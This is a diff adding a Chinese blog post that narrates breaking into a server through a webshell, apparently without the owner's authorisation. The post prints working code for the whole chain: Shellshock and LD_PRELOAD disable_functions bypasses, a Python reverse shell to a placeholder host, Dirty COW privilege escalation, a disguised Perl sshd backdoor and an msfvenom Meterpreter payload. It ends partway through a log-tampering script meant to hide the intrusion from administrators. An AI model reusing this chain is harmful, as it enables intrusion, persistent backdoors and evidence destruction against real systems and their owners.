@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>一次艰难的渗透提权过程 - F0rmat&#39;Blog</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+</head>
+<body>
+<header>
+  <div>
+    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
+  </div>
+  <nav></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>一次艰难的渗透提权过程</h1>
+  </div>
+<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
+<div class="container text-center mt-3">
+    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
+</div>
+</div>
+<div class="meta">
+  <div>2019-09-09 02:11</div>
+  <div>
+    </div>
+  </div>
+<div class="content">
+  <h1 id="0x01-前言">0x01 前言</h1>
+<p>某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/1.png" alt=""></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/2.png" alt=""></p>
+<p>Getshell的漏洞分析在:https://getpass.cn/2019/09/06/An-APP-distribution-system-upload-vulnerability/</p>
+<p>然后搞了好久熬了一个晚上才弄好，中间走了很多弯路。。。</p>
+<h1 id="0x02-信息探测">0x02 信息探测</h1>
+<p>上一个phpinfo看下环境</p>
+<pre><code>PHP Version 5.6.30
+disable_functions:
+passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru
+sendmail_path:/usr/sbin/sendmail -t -i
+mysql:	mysqlnd 5.0.11-dev - 20120503
+</code></pre><p>宝塔警告！
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/3.png" alt=""></p>
+<p>问了宝塔的开发工程师，宝塔确实是做得挺好的，Windows的基本没什么希望了，看下Linux的。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/4.png" alt=""></p>
+<h1 id="0x03-肝">0x03 肝</h1>
+<p><code>putenv</code>这个没禁可以利用一下，看了P神的一篇文章：https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html
+<a href="http://www.exploit-db.com/exploits/35146/">http://www.exploit-db.com/exploits/35146/</a> 的POC</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
+<span style="color:#75715e"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
+</span><span style="color:#75715e"># Google Dork: none 
+</span><span style="color:#75715e"># Date: 10/31/2014 
+</span><span style="color:#75715e"># Exploit Author: Ryan King (Starfall) 
+</span><span style="color:#75715e"># Vendor Homepage: http://php.net 
+</span><span style="color:#75715e"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
+</span><span style="color:#75715e"># Version: 5.* (tested on 5.6.2) 
+</span><span style="color:#75715e"># Tested on: Debian 7 and CentOS 5 and 6 
+</span><span style="color:#75715e"># CVE: CVE-2014-6271 
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">shellshock</span>($cmd) { <span style="color:#75715e">// Execute a command via CVE-2014-6271 @mail.c:283 
+</span><span style="color:#75715e"></span>   $tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">tempnam</span>(<span style="color:#e6db74">&#34;.&#34;</span>,<span style="color:#e6db74">&#34;data&#34;</span>); 
+   <span style="color:#a6e22e">putenv</span>(<span style="color:#e6db74">&#34;PHP_LOL=() { x; }; </span><span style="color:#e6db74">$cmd</span><span style="color:#e6db74"> &gt;</span><span style="color:#e6db74">$tmp</span><span style="color:#e6db74"> 2&gt;&amp;1&#34;</span>); 
+   <span style="color:#75715e">// In Safe Mode, the user may only alter environment variableswhose names 
+</span><span style="color:#75715e"></span>   <span style="color:#75715e">// begin with the prefixes supplied by this directive. 
+</span><span style="color:#75715e"></span>   <span style="color:#75715e">// By default, users will only be able to set environment variablesthat 
+</span><span style="color:#75715e"></span>   <span style="color:#75715e">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
+</span><span style="color:#75715e"></span>   <span style="color:#75715e">// PHP will let the user modify ANY environment variable! 
+</span><span style="color:#75715e"></span>   <span style="color:#a6e22e">mail</span>(<span style="color:#e6db74">&#34;a@127.0.0.1&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;-bv&#34;</span>); <span style="color:#75715e">// -bv so we don&#39;t actuallysend any mail 
+</span><span style="color:#75715e"></span>   $output <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">file_get_contents</span>($tmp); 
+   <span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>($tmp); 
+   <span style="color:#66d9ef">if</span>($output <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#66d9ef">return</span> $output; 
+   <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;No output, or not vuln.&#34;</span>; 
+} 
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shellshock</span>($_REQUEST[<span style="color:#e6db74">&#34;cmd&#34;</span>]); 
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/5.png" alt=""></p>
+<p>没戏。。</p>
+<p>继续肝。。。</p>
+<h1 id="0x04-新希望-ld_preload">0x04 新希望 LD_PRELOAD</h1>
+<p>上gayhub上面搜了一下看到了一篇不错的姿势https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</p>
+<p>按照了里面的一段代码<code>bypass_disablefunc.c</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define _GNU_SOURCE
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+
+__attribute__ ((__constructor__)) <span style="color:#66d9ef">void</span> preloadme (<span style="color:#66d9ef">void</span>)
+{
+    unsetenv(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
+    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> cmdline <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;EVIL_CMDLINE&#34;</span>);
+    system(cmdline);
+}
+</code></pre></div><p>编译了一下
+然后上传调用文件php</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&#34;</span>;
+
+    $cmd <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>];
+    $out_path <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;outpath&#34;</span>];
+    $evil_cmdline <span style="color:#f92672">=</span> $cmd <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; &gt; &#34;</span> <span style="color:#f92672">.</span> $out_path <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; 2&gt;&amp;1&#34;</span>;
+    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &#34;</span> <span style="color:#f92672">.</span> $evil_cmdline <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/p&gt;&#34;</span>;
+
+    <span style="color:#a6e22e">putenv</span>(<span style="color:#e6db74">&#34;EVIL_CMDLINE=&#34;</span> <span style="color:#f92672">.</span> $evil_cmdline);
+
+    $so_path <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;sopath&#34;</span>];
+    <span style="color:#a6e22e">putenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD=&#34;</span> <span style="color:#f92672">.</span> $so_path);
+
+    <span style="color:#a6e22e">mail</span>(<span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>);
+
+    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">nl2br</span>(<span style="color:#a6e22e">file_get_contents</span>($out_path)) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/p&gt;&#34;</span>; 
+
+    <span style="color:#a6e22e">unlink</span>($out_path);
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>利用的时候没回显，what？
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/6.png" alt=""></p>
+<p>又找了一篇文章：https://www.cnblogs.com/leixiao-/p/10612798.html
+还是利用unix的<code>LD_PRELOAD</code>和php的<code>putenv</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>__attribute__((constructor)) <span style="color:#66d9ef">void</span> l3yx(){
+    unsetenv(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
+    system(getenv(<span style="color:#e6db74">&#34;_evilcmd&#34;</span>));
+}
+</code></pre></div><p>利用php文件</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#a6e22e">putenv</span>(<span style="color:#e6db74">&#34;_evilcmd=echo 1&gt;/root/tmp/222222&#34;</span>);
+<span style="color:#a6e22e">putenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD=./evil.so&#34;</span>);
+<span style="color:#a6e22e">mail</span>(<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>);
+</code></pre></div><p>执行后去刷新了一下目录，！！！！我去，成功了！</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/7.png" alt=""></p>
+<p>但是这样执行代码总是有众多不便的，比如没有回显，把命令带参数执行的时候会报错等
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/8.png" alt=""></p>
+<p>还得继续。。。</p>
+<h1 id="0x05-柳暗花明又一村-centos">0x05 柳暗花明又一村-centos</h1>
+<p>看了大佬一篇文章https://www.meetsec.cn/index.php/archives/44/</p>
+<p>一个修复版的bypass.c,作者的解释：</p>
+<blockquote>
+<p>如果你是一个细心的人你会发现这里的bypass_disablefunc.c（来自github）和教程中提及的不一样，多出了使用for循环修改LD_PRELOAD的首个字符改成\0，如果你略微了解C语言就会知道\0是C语言字符串结束标记，原因注释里有：unsetenv(&ldquo;LD_PRELOAD&rdquo;)在某些Linux发行版不一定生效（如CentOS），这样一个小动作能够让系统原有的LD_PRELOAD环境变量自动失效</p>
+</blockquote>
+<p>然后从环境变量 EVIL_CMDLINE 中接收 bypass_disablefunc.php 传递过来的待执行的命令行。</p>
+<p>用命令 gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so 将 bypass_disablefunc.c 编译为共享对象 bypass_disablefunc_x64.so：</p>
+<p>要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define _GNU_SOURCE
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+
+<span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> environ;
+
+__attribute__ ((__constructor__)) <span style="color:#66d9ef">void</span> preload (<span style="color:#66d9ef">void</span>)
+{
+    <span style="color:#75715e">// get command line options and arg
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> cmdline <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;EVIL_CMDLINE&#34;</span>);
+
+    <span style="color:#75715e">// unset environment variable LD_PRELOAD.
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// unsetenv(&#34;LD_PRELOAD&#34;) no effect on some 
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// distribution (e.g., centos), I need crafty trick.
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> i;
+    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; environ[i]; <span style="color:#f92672">++</span>i) {
+            <span style="color:#66d9ef">if</span> (strstr(environ[i], <span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>)) {
+                    environ[i][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+            }
+    }
+
+    <span style="color:#75715e">// executive command
+</span><span style="color:#75715e"></span>    system(cmdline);
+}
+</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/9.png" alt=""></p>
+<p>偶~sex!
+后来作者确实改进了代码
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/10.png" alt="">
+中间也发现了一篇不错的方法：https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/</p>
+<h2 id="劫持getuid">劫持getuid()</h2>
+<p>基本原理
+前提是在Linux中已安装并启用sendmail程序。</p>
+<p>php的mail()函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，而/usr/sbin/sendmail会调用getuid()。如果我们能通过LD_PRELOAD的方式来劫持getuid()，再用mail()函数来触发sendmail程序进而执行被劫持的getuid()，从而就能执行恶意代码了。</p>
+<p>细化一下：</p>
+<p>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 evil.so；
+运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 evil.so，以便后续启动新进程时优先加载该共享对象；
+运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 evil.so 中的同名 getuid() 所劫持；
+达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">geteuid</span>() {
+        <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> cmdline <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;EVIL_CMDLINE&#34;</span>);
+        <span style="color:#66d9ef">if</span> (getenv(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>) <span style="color:#f92672">==</span> NULL) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; }
+        unsetenv(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
+        system(cmdline);
+}
+</code></pre></div><p><code>gcc -shared -fPIC bypass.c -o byapss.so</code> 编译了一下去利用，发现可以哦！</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/11.png" alt=""></p>
+<h1 id="0x06-脏牛提权">0x06 脏牛提权</h1>
+<p>可以执行命令了，执行上反弹shell，有交互的shell舒服多了，这里用python的反弹脚本，一般系统有装python脚本，我都会先用pyhton，因为有一些系统的不一样，bash或者nc比较麻烦。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os
+s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
+s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;x.x.x.x&#34;</span>,<span style="color:#ae81ff">7777</span>))
+os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
+os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
+os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
+p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span>]);
+</code></pre></div><p>监听一波
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/12.png" alt="">
+反弹成功了
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/13.png" alt=""></p>
+<p>执行<code>uname -a</code>看了下版本</p>
+<p>Linux cloud 2.6.32-642.el6.x86_64 #1 SMP Tue May 10 17:27:01 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</p>
+<p>2.6的版本上脏牛必中，可以不用在目标机子上面编译，在自己的Linux环境编译然后上传到目标机子上面执行
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/14.png" alt=""></p>
+<p>那就静静等待脏牛把root替换掉，然后脸上目标机子，大概要几分钟这样子，去连ssh的时候有些管理员会把ssh的端口改了，用命令<code>netstat -nlp</code>就可以看到了。</p>
+<p>已经成功了，用户名为<code>firefart</code>密码是刚设置的123456。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/15.png" alt=""></p>
+<p>已经成功登陆目标机子
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/16.png" alt=""></p>
+<h1 id="0x07-持续访问-ssh后门">0x07 持续访问-ssh后门</h1>
+<p>登陆目标机子后，记得及时恢复/etc/passwd</p>
+<pre><code>cp /tmp/passwd.bak /etc/passwd
+</code></pre><p>看过一篇文章，觉得这个后门也不错，https://www.freebuf.com/articles/system/140880.html</p>
+<p>那些pam补丁、隐藏文件、suid、inetd等都可以用作后门，看你环境。</p>
+<ol>
+<li>这个ssh 后门伪装成一个perl脚本，名为sshd，位于/usr/sbin/sshd , 将系统原先的sshd 移到/usr/bin下</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/perl</span>
+<span style="color:#66d9ef">exec</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#66d9ef">if</span>(getpeername(STDIN)<span style="color:#f92672">=~/^..</span>zf<span style="color:#f92672">/</span>);
+<span style="color:#66d9ef">exec</span>{<span style="color:#e6db74">&#34;/usr/bin/sshd&#34;</span>}<span style="color:#e6db74">&#34;/usr/sbin/sshd&#34;</span>,<span style="color:#a6e22e">@ARGV</span>;
+</code></pre></div><ol start="2">
+<li>将真正的sshd 移至/usr/bin/sshd</li>
+</ol>
+<pre><code>mv /usr/sbin/sshd /usr/bin/sshd
+</code></pre><ol start="3">
+<li>将后门sshd (perl脚本移动至/usr/sbin/sshd),并授予执行权限</li>
+</ol>
+<pre><code>chmod +x /usr/sbin/sshd 
+</code></pre><ol start="4">
+<li>重启 ssh 服务</li>
+</ol>
+<pre><code>/etc/init.d/sshd restart
+</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/17.png" alt="">
+5.连接后门，记得安装好socat</p>
+<pre><code>sudo yum install socat
+</code></pre><pre><code>#socat STDIO TCP4:目标ip:ssh端口一般是22,sourceport=31334
+socat STDIO TCP4:127.0.0.1:22,sourceport=31334
+</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/18.png" alt=""></p>
+<h1 id="0x08-metaspliot-横向渗透">0x08 metaspliot 横向渗透</h1>
+<p>当然做内网渗透必不可少的就是msf了，如果是Windows的话推荐使用<code>CobaltStrike</code>非常nice的一个工具。</p>
+<p>反正我们现在拿到root的shell了，先反弹一个Meterpreter的会话，还是常规的生成payload，然后监听等待上线</p>
+<ol>
+<li>先生成一个后门</li>
+</ol>
+<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.79.132 LPORT=4455 -f elf &gt; shell.elf
+</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/19.png" alt="">
+2. 把shell.elf上传到目标机子上面运行
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/20.png" alt=""></p>
+<ol start="3">
+<li>在本地执行监听</li>
+</ol>
+<pre><code>use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4455
+exploit
+</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/21.png" alt=""></p>
+<ol start="4">
+<li>执行后门反弹Meterpreter的会话</li>
+</ol>
+<pre><code>chmod +x ./shell.elf
+./shell.elf
+</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/22.png" alt="">
+5.查看跳板机处于哪几个网段</p>
+<pre><code>run get_local_subnets
+</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/23.png" alt=""></p>
+<p>看了一下。。。</p>
+<p>但是我这个是属于外网的机子，后来想了一下感觉都不是内网一点意思都没有。。。</p>
+<p>算了吧下次有遇到内网的可以再写一篇内网渗透的文章出来哈</p>
+<h1 id="0x09-擦屁股">0x09 擦屁股</h1>
+<p>走之后记得清理痕迹，以防被溯源或者被管理员发现了。下面附上一个脚本供大家使用：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python </span>
+<span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> struct<span style="color:#f92672">,</span> sys
+<span style="color:#f92672">from</span> pwd <span style="color:#f92672">import</span> getpwnam
+<span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> strptime, mktime
+<span style="color:#f92672">from</span> optparse <span style="color:#f92672">import</span> OptionParser
+
+UTMPFILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/run/utmp&#34;</span>
+WTMPFILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/log/wtmp&#34;</span>
+LASTLOGFILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/log/lastlog&#34;</span>
+
+LAST_STRUCT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;I32s256s&#39;</span>
+LAST_STRUCT_SIZE <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>calcsize(LAST_STRUCT)
+
+XTMP_STRUCT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hi32s4s32s256shhiii4i20x&#39;</span>
+XTMP_STRUCT_SIZE <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>calcsize(XTMP_STRUCT)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getXtmp</span>(filename, username, hostname):
+    xtmp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">try</span>:
+        fp <span style="color:#f92672">=</span> open(filename, <span style="color:#e6db74">&#39;rb&#39;</span>)
+        <span style="color:#66d9ef">while</span> True:
+            bytes <span style="color:#f92672">=</span> fp<span style="color:#f92672">.</span>read(XTMP_STRUCT_SIZE)
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> bytes:
+                <span style="color:#66d9ef">break</span>
+
+            data <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(XTMP_STRUCT, bytes)
+            record <span style="color:#f92672">=</span> [(<span style="color:#66d9ef">lambda</span> s: str(s)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">0</span>])(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> data]
+            <span style="color:#66d9ef">if</span> (record[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> username <span style="color:#f92672">and</span> record[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> hostname):
+                <span style="color:#66d9ef">continue</span>
+            xtmp <span style="color:#f92672">+=</span> bytes
+    <span style="color:#66d9ef">except</span>:
+        showMessage(<span style="color:#e6db74">&#39;Cannot open file: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> filename)
+    <span style="color:#66d9ef">finally</span>:
+        fp<span style="color:#f92672">.</span>close()
+    <span style="color:#66d9ef">return</span> xtmp
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">modifyLast</span>(filename, username, hostname, ttyname, strtime):
+    <span style="color:#66d9ef">try</span>:
+        p <span style="color:#f92672">=</span> getpwnam(username)
+    <span style="color:#66d9ef">except</span>:
+        showMessage(<span style="color:#e6db74">&#39;No such user.&#39;</span>)
+
+    timestamp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">try</span>:
+        str2time <span style="color:#f92672">=</span> strptime(strtime, <span style="color:#e6db74">&#39;%Y:%m:</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">:%H:%M:%S&#39;</span>)
+        timestamp <span style="color:#f92672">=</span> int(mktime(str2time))
+    <span style="color:#66d9ef">except</span>:
+        showMessage(<span style="color:#e6db74">&#39;Time format err.&#39;</span>)
+
+    data <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(LAST_STRUCT, timestamp, ttyname, hostname)
+    <span style="color:#66d9ef">try</span>:
+        fp <span style="color:#f92672">=</span> open(filename, <span style="color:#e6db74">&#39;wb&#39;</span>)
+        fp<span style="color:#f92672">.</span>seek(LAST_STRUCT_SIZE <span style="color:#f92672">*</span> p<span style="color:#f92672">.</span>pw_uid)
+        fp<span style="color:#f92672">.</span>write(data)
+    <span style="color:#66d9ef">except</span>:
+        showMessage(<span style="color:#e6db74">&#39;Cannot open file: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> filename)
+    <span style="color:#66d9ef">finally</span>:
+        fp<span style="color:#f92672">.</span>close()
+    <span style="color:#66d9ef">return</span> True
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">showMessage</span>(msg):
+    <span style="color:#66d9ef">print</span> msg
+    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+
+
